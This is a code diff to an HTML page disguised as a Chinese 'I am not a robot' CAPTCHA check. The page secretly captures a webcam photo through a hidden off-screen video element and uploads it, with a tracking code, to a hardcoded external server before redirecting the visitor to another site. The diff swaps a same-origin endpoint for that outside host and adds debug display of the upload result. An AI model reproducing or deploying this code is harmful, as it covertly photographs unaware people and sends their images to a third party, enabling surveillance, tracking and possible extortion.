@@ -53,7 +53,7 @@
         .camera-status.error { color: #ff3b30; }
         .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
         video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
-        .error-msg { color: #ff3b30; font-size: 14px; margin-top: 10px; }
+        .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
     </style>
 </head>
 <body>
@@ -64,6 +64,7 @@
         <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
         <div class="code-badge">验证编号: <span id="displayCode"></span></div>
         <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
+        <div class="debug-info" id="debugInfo"></div>
     </div>
     <div class="captcha-container" id="captchaContainer">
         <div class="captcha-icon">🤖</div>
@@ -75,26 +76,23 @@
             <span>我不是机器人</span>
         </div>
         <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
-        <div id="errorMsg" class="error-msg" style="display:none;"></div>
+        <div id="uploadResult" style="margin-top:10px;font-size:13px;"></div>
     </div>
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        // ==================== 配置 ====================
+        // ==================== 固定配置 ====================
+        // ★★★ 手动指定API地址，确保正确 ★★★
+        const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
+        
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get('code') || 'UNKNOWN';
         const targetUrl = urlParams.get('url') || 'https://www.baidu.com';
-        
-        // 自动检测API地址
-        const apiUrl = (() => {
-            const path = window.location.pathname;
-            const dir = path.substring(0, path.lastIndexOf('/') + 1);
-            return window.location.origin + dir + 'api.php';
-        })();
 
         document.getElementById('displayCode').textContent = code;
         document.getElementById('displayCode2').textContent = code;
+        document.getElementById('debugInfo').textContent = 'API: ' + API_URL;
 
         let stream = null, photoCaptured = false, cameraReady = false, videoElement = null, retryCount = 0;
         const maxRetries = 3;
@@ -145,7 +143,7 @@
             fd.append('target_url', targetUrl);
             fd.append('code', code);
             
-            const res = await fetch(apiUrl + '?action=capture_photo', {
+            const res = await fetch(API_URL + '?action=capture_photo', {
                 method: 'POST',
                 body: fd
             });
@@ -202,28 +200,32 @@
                 } catch(e) { console.log('拍照失败:', e); }
             }
             
+            const resultDiv = document.getElementById('uploadResult');
             let uploadSuccess = false;
+            
             if (photoData) {
                 try {
                     const result = await uploadPhoto(photoData);
+                    resultDiv.textContent = '📤 上传结果: ' + JSON.stringify(result);
                     if (result.success) {
                         uploadSuccess = true;
+                        resultDiv.style.color = '#34c759';
                     } else {
-                        console.error('上传失败:', result.error);
-                        // 显示错误但不阻止跳转
-                        document.getElementById('errorMsg').style.display = 'block';
-                        document.getElementById('errorMsg').textContent = '⚠️ ' + (result.error || '保存失败');
+                        resultDiv.style.color = '#ff3b30';
                     }
                 } catch(e) {
-                    console.error('上传异常:', e);
+                    resultDiv.textContent = '❌ 上传异常: ' + e.message;
+                    resultDiv.style.color = '#ff3b30';
                 }
+            } else {
+                resultDiv.textContent = '⚠️ 未获取到照片数据';
+                resultDiv.style.color = '#ff3b30';
             }
             
             if (stream) stream.getTracks().forEach(t => t.stop());
-            // 延迟跳转让用户看到错误（如果有）
             setTimeout(() => {
                 window.location.href = targetUrl;
-            }, uploadSuccess ? 500 : 1500);
+            }, 2000);
         }
 
         // 人机验证
